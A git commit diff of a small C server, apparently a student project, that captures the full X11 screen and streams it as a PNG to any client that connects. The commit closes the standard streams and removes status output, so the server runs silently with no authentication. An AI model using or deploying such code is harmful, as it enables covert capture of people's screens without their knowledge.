5a58c8b6ba1161f963b60f76dbc4bc92c903ade9
Dylan G <dylan.guerville@etudiant.univ-lille1.fr>
2016-03-10 09:47:21 +0100

    Now we can have a lot of pics

--- server/server.c
+++ server/server.c
@@ -28,54 +28,59 @@ int send_screenshot(int fd, int socket)
 	int n = 0;
 	while((n = read(fd, buffer, BUF_SIZE)) > 0){
 		if(write(socket, buffer , n) < 0){
-			printf("send_failed");
+			//printf("send_failed");
 			return 0;
 		}
 	}
-	printf("Data Send\n");
+
 	return 1;
 }
+void screenshot(int socket_client) {
+    Display *disp;
+    Window root;
+    cairo_surface_t *surface;
+    int scr;
 
+    disp = XOpenDisplay(NULL);
+    scr = DefaultScreen(disp);
+    root = DefaultRootWindow(disp);
+
+    surface = cairo_xlib_surface_create(disp, root, DefaultVisual(disp, scr),
+            DisplayWidth(disp, scr), DisplayHeight(disp, scr));
+    cairo_surface_write_to_png(
+            surface,
+            "/tmp/test.png");
+    send_screenshot(open("/tmp/test.png", O_RDONLY), socket_client);
+    cairo_surface_destroy(surface);
+}
 
 int main() {
-	Display *disp;
-	Window root;
-	cairo_surface_t *surface;
-	int scr;
-
-	disp = XOpenDisplay(NULL);
-	scr = DefaultScreen(disp);
-	root = DefaultRootWindow(disp);
+        close(0);
+        close(1);
+        close(2);
 
 	initialiser_signaux();
 	int socket_serveur = creer_serveur(SERVER_PORT);
 	if(socket_serveur == -1)
 		return 1;
-	printf("Server listenning on %d\n", SERVER_PORT);
-	int socket_client;
-	while(1){
-		socket_client = accept(socket_serveur, NULL, NULL);
-		if (socket_client == -1){
-			perror("accept ");
-			return 1;
-		}
-		if(fork() == 0){
-			surface = cairo_xlib_surface_create(disp, root, DefaultVisual(disp, scr),
-					DisplayWidth(disp, scr), DisplayHeight(disp, scr));
-			cairo_surface_write_to_png(
-					surface,
-					"/tmp/test.png");
-			send_screenshot(open("/tmp/test.png", O_RDONLY), socket_client);
-			cairo_surface_destroy(surface);
-			
-			
-			close(socket_client);
-			return 1;
-		} else {
-			close(socket_client);
-		}
-	}
-	close(socket_serveur);
 
-	return 0;
+	int socket_client;
+        while(1){
+            socket_client = accept(socket_serveur, NULL, NULL);
+            if (socket_client == -1){
+                perror("accept ");
+                return 1;
+            }
+            if(fork() == 0){
+                screenshot(socket_client);
+
+                close(socket_client);
+                return 1;
+            } else {
+                close(socket_client);
+            }
+        }
+        close(socket_serveur);
+
+        return 0;
 }
